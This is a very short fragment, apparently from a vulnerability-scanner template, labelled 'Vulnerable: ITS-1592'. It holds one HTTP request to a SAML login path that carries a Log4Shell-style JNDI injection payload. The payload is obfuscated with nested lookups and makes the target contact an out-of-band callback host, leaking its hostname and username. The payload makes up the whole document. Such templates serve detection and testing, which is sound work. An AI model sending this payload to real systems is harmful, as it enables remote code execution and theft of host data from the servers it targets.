# Vulnerable: ITS-1592
GET /login/SAML?=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}/{{str}}}
